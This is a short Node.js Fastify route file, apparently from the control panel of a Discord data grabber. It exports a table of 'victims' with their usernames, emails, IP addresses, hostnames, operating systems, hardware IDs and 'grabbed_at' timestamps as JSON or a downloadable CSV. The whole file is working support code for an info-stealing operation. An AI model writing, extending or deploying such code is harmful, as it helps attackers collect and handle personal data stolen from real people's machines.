const { getAllVictimsForExport } = require('../lib/supabase');
const { checkRateLimit } = require('../lib/rate-limit');

function sanitizeCsv(val) {
  if (!val) return '';
  if (/^[=+\-@\t\r]/.test(val)) val = "'" + val;
  return '"' + val.replace(/"/g, '""') + '"';
}

async function exportRoutes(fastify) {
  fastify.get('/', async (req, reply) => {
    const userCookie = req.cookies?.discord_user;
    if (!userCookie) return reply.code(401).send({ error: 'Unauthorized' });
    const rl = checkRateLimit('export', 10, 60000);
    if (!rl.allowed) return reply.code(429).send({ error: 'Too many requests' });
    const format = req.query.format || 'json';
    const victims = await getAllVictimsForExport();
    if (format === 'csv') {
      const headers = 'id,user_id,username,global_name,email,ip,hostname,os,hwid,source,tags,grabbed_at\n';
      const rows = victims.map(v => [v.id, v.user_id, sanitizeCsv(v.username || ''), sanitizeCsv(v.global_name || ''), sanitizeCsv(v.email || ''), sanitizeCsv(v.ip || ''), sanitizeCsv(v.hostname || ''), sanitizeCsv(v.os || ''), sanitizeCsv(v.hwid || ''), sanitizeCsv(v.source || ''), sanitizeCsv((Array.isArray(v.tags) ? v.tags : []).join(';')), sanitizeCsv(v.grabbed_at || '')].join(',')).join('\n');
      reply.header('Content-Type', 'text/csv').header('Content-Disposition', 'attachment; filename=victims.csv');
      return reply.send(headers + rows);
    }
    return victims;
  });
}

module.exports = exportRoutes;
